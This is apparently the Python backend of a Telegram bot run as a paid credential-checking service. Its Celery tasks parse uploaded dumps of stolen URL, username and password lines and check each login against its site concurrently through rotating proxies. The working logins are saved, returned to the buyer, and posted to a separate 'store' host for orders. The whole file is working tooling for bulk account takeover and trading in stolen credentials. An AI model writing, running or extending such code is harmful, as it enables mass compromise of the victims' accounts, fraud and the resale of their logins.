import asyncio
from datetime import datetime
from typing import List

import aiohttp
import requests
import os
from aiogram.types import InputFile

from bot import bot
from celery_app import app
from entities.async_validator import AsyncValidator, AsyncApiValidator
from entities.constants import FILE_API_URL, proxies, CHUNK_SIZE, TIMEOUT, TIMEOUT_VALID
from entities.db.db_repos import UserRepo, ActivationRepo
from entities.functions import add_credentials_to_db, form_credentials_admin
from entities.user import User
from other.constants import IDS
from other.text_dicts import scan_text


def get_file_credentials(file_path: str, file_id: str) -> dict:
    result = {
        'status': 1,
        'credentials': [],
        'amount': 0,
    }
    data = {
        'file_id': file_id,
    }
    try:
        response = requests.get(
            url=f"{FILE_API_URL}{os.getenv('BOT_TOKEN')}/{file_path}",
            data=data
        )
        response.encoding = 'UTF-8'
        if len(response.text) > 0:
            for item in response.text.split('\n'):
                result_item = str(item).strip().split('|')
                if len(result_item) == 4:
                    result['credentials'].append({
                        'path': result_item[0] if len(result_item[0]) < 200 else 'Too big',
                        'url': result_item[1],
                        'credentials': {
                            'user': result_item[2],
                            'pass': result_item[3],
                        }
                    })
        result['status'] = 0
        result['amount'] = len(result['credentials'])
    except Exception:
        pass
    return result


async def validate_credentials(data: list, validator: AsyncValidator):
    connector = aiohttp.TCPConnector(limit=int(os.getenv('CONNECTIONS')))
    tasks = []
    async with aiohttp.ClientSession(connector=connector) as session:
        for item in data:
            user = User(item)
            task = asyncio.ensure_future(validator.get_deliverability(session=session, user=user))
            tasks.append(task)
        result = asyncio.gather(*tasks)
        new_result = await result
    return new_result


async def short_validate_credentials(data: list, validator: AsyncValidator):
    connector = aiohttp.TCPConnector(limit=int(os.getenv('CONNECTIONS')))
    tasks = []
    async with aiohttp.ClientSession(connector=connector) as session:
        for item in data:
            task = asyncio.ensure_future(validator.validate_credentials(session=session, user=item))
            tasks.append(task)
        result = asyncio.gather(*tasks)
        new_result = await result
    return new_result


async def validate_proxy(proxy: str, session: aiohttp.ClientSession):
    try:
        async with session.get("https://google.com",
                               proxy=proxy,
                               ) as resp:
            status = resp.status
            return {'result': True if status == 200 else False, 'proxy': proxy}
    except Exception:
        return {'result': False, 'proxy': proxy}


async def validate_proxies(data: List[str]):
    connector = aiohttp.TCPConnector(limit=int(os.getenv('CONNECTIONS')))
    tasks = []
    async with aiohttp.ClientSession(connector=connector) as session:
        for proxy in data:
            task = asyncio.ensure_future(validate_proxy(proxy, session))
            tasks.append(task)
        result = asyncio.gather(*tasks)
        new_result = await result
        for proxy_result in new_result:
            if proxy_result['result'] is True:
                return proxy_result
        return {'result': False}


def to_list_of_lists(credentials: list, chunk_size: int) -> List[list]:
    result = []
    while len(credentials) > 0:
        if len(credentials) > chunk_size:
            chunk = credentials[0:chunk_size]
            result.append(chunk)
            credentials = credentials[chunk_size:]
        else:
            result.append(credentials)
            break
    return result


def decide_timeout(credentials_amount: int):
    result = TIMEOUT
    if credentials_amount < CHUNK_SIZE:
        result = credentials_amount * 0.1
    return int(result) if result >= 100 else 10


@app.task
def validate(scan_file_id: str, scan_file_path: str, user_id: id, lang: str, activation_amount: int, activation_id: str):
    # Validating proxies
    proxy_data = asyncio.run(validate_proxies(proxies))
    if not proxy_data['result']:
        sync_send_message(
            chat_id=user_id,
            message='Sorry there is no available proxies right now, please contact our support for more info.'
        )
        return 0

    # Getting data from document
    user_repo = UserRepo()
    activation_repo = ActivationRepo()
    activation = activation_repo.get(activation_id)
    file_result = get_file_credentials(file_path=scan_file_path, file_id=scan_file_id)
    if file_result['status'] > 1:
        sync_send_message(message="Sorry, we couldn't find your file", chat_id=user_id)
        return 0
    else:
        if file_result['amount'] >= activation.amount_once:
            file_result['amount'] = int(activation.amount_once)
            file_result['credentials'] = file_result['credentials'][0:int(activation.amount_once)]
        amount_remaining = activation_amount - file_result['amount']
        if amount_remaining <= 0:
            amount_to_scan = activation_amount
            file_result['credentials'] = file_result['credentials'][0:amount_to_scan]
            amount_remaining = 0
        result = to_list_of_lists(file_result['credentials'], CHUNK_SIZE)
    validator = AsyncApiValidator(
        proxy_data['proxy'],
        timeout=decide_timeout(len(file_result['credentials'])),
        valid_timeout=TIMEOUT_VALID,
    )
    # Updating activation
    activation.amount_check = amount_remaining
    activation.amount_month = activation.amount_month - len(file_result['credentials'])
    activation_repo.update(activation)

    # Scanning for data
    semy_result = [
        asyncio.run(validate_credentials(item, validator)) for item in result
    ]
    semy_semy_result = []
    for item in semy_result:
        semy_semy_result += item
    new_result = [
        validator.get_ssl(item) for item in semy_semy_result if item.get('result') == 0
    ]
    valid_credentials = add_credentials_to_db(data=new_result)

    # Getting data for message
    result = form_credentials_admin(valid_credentials)

    # Messaging user
    activation = activation_repo.get(activation_id)
    message = scan_text[lang]['scan'].format(str(activation.amount_check), )
    text_file = InputFile(path_or_bytesio=result, filename=f'{datetime.now()}-{user_id}.txt')
    sync_send_document(
        chat_id=user_id, document=text_file, caption=message
    )
    user_repo.add_to_count(tele_id=user_id, amount=file_result['amount'])


def sort_remote_credentials(credentials: list) -> List[List[User]]:
    data = [
        User(
                {
                    'url': item['url'],
                    'path': 'something',
                    'id': item['id'],
                    'credentials': {
                        'user': item['user'],
                        'pass': item['pass']
                    },
                }
        )
        for item in credentials
    ]
    data = to_list_of_lists(
        credentials=data,
        chunk_size=CHUNK_SIZE,
    )
    return data


@app.task
def validate_remote_credentials(credentials: list, order_id: int):
    data = sort_remote_credentials(credentials)
    proxy_data = asyncio.run(validate_proxies(proxies))
    validator = AsyncApiValidator(
        proxy_data['proxy'],
        timeout=TIMEOUT,
        valid_timeout=TIMEOUT_VALID
    )
    semy_result = [
        asyncio.run(short_validate_credentials(item, validator)) for item in data
    ]
    semy_semy_result = []
    for item in semy_result:
        semy_semy_result += item
    result = [
        {
            'url': item['url'],
            'user': item['credentials']['user'],
            'pass': item['credentials']['pass'],
        } for item in semy_semy_result if item['result'] == 0
    ]
    bad_result = [
        item['id'] for item in semy_semy_result if item['result'] != 0
    ]
    data_json = {
        'order_id': order_id,
        'result': result,
        'bad_result': bad_result,
    }
    requests.post(
        f'{os.getenv("OTHER_HOST")}api/{os.getenv("OTHER_TOKEN")}/order_check',
        json=data_json,
    )


async def send_document(chat_id: int, document: InputFile, caption: str):
    await bot.send_document(
        chat_id=chat_id,
        document=document,
        caption=caption,
    )


def sync_send_document(chat_id: int, document: InputFile, caption: str):
    asyncio.run(send_document(
        chat_id=chat_id,
        document=document,
        caption=caption,
    ))


async def send_message(message, chat_id):
    await bot.send_message(chat_id=chat_id, text=message)


def sync_send_message(message, chat_id):
    asyncio.run(send_message(chat_id=chat_id, message=message))


@app.on_after_configure.connect
def setup_periodic_tasks(sender, **kwargs):
    sender.add_periodic_task(60, check.s(), expires=15)


@app.task
def check():
    try:
        result = requests.get(os.getenv('OTHER_HOST') + 'api/check')
        if result.status_code == 200:
            return 0
        else:
            raise Exception
    except Exception:
        for id_ in IDS:
            sync_send_message(
                "Store not working",
                id_,
            )
